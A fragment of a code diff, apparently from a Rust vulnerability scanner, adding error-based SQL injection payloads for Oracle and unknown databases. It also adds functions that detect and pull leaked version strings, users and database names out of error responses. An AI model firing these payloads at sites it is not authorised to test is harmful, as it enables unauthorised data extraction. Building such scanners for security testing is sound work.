+                            "CAST extraction",
+                            "conversion"
+                        ));
+                    }
+                }
+            }
+            DatabaseType::Oracle => {
+                match context {
+                    InjectionContext::Numeric => {
+                        payloads.push((
+                            " AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))",
+                            "Context indexing",
+                            "DRG"
+                        ));
+                        payloads.push((
+                            " AND UTL_INADDR.get_host_name((SELECT user FROM dual))",
+                            "Network function",
+                            "ORA-"
+                        ));
+                    }
+                    _ => {
+                        payloads.push((
+                            "' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))='1",
+                            "Context indexing",
+                            "DRG"
+                        ));
+                    }
+                }
+            }
+            _ => {
+                // Generic payloads for unknown databases
+                match context {
+                    InjectionContext::Numeric => {
+                        payloads.push((
+                            " AND CAST((SELECT 1) AS int)",
+                            "Generic type casting",
+                            "error"
+                        ));
+                    }
+                    _ => {
+                        payloads.push((
+                            "' AND CAST((SELECT 1) AS int)='1",
+                            "Generic type casting",
+                            "error"
+                        ));
+                    }
+                }
+            }
+        }
+
+        payloads
+    }
+
+    /// Detect data leakage in error messages
+    fn detect_data_leakage(&self, body: &str) -> bool {
+        let body_lower = body.to_lowercase();
+
+        // Patterns indicating data extraction via errors
+        let leak_patterns = [
+            "version(",
+            "@@version",
+            "database()",
+            "user(",
+            "current_user",
+            "db_name",
+            "system_user",
+            "0x7e", // Delimiter often used in extraction
+            "xpath",
+            "extractvalue",
+            "updatexml",
+        ];
+
+        leak_patterns.iter().any(|pattern| body_lower.contains(pattern))
+    }
+
+    /// Extract leaked data from error messages
+    fn extract_leaked_data(&self, body: &str) -> Option<String> {
+        // Look for data between common delimiters
+        if let Some(start) = body.find("~") {
+            if let Some(end) = body[start + 1..].find("~") {
+                let data = &body[start + 1..start + 1 + end];
+                if !data.is_empty() && data.len() < 200 {
+                    return Some(data.to_string());
+                }
+            }
+        }
+
+        // Look for version strings
+        if body.to_lowercase().contains("mysql") {
+            if let Some(pos) = body.to_lowercase().find("mysql") {
+                let snippet = &body[pos..std::cmp::min(pos + 50, body.len())];
+                return Some(snippet.to_string());
+            }
+        }
+
+        // Look for database names in errors
+        let patterns = ["database '", "database: ", "db: "];
+        for pattern in patterns {
+            if let Some(pos) = body.to_lowercase().find(pattern) {
+                let start = pos + pattern.len();
+                if let Some(end) = body[start..].find(&['\'', '"', ' '][..]) {
+                    let data = &body[start..start + end];
+                    if !data.is_empty() {
+                        return Some(data.to_string());
+                    }
+                }
+            }
+        }
+
+        None
     }
 
     /// Check if vulnerability is new (thread-safe deduplication)
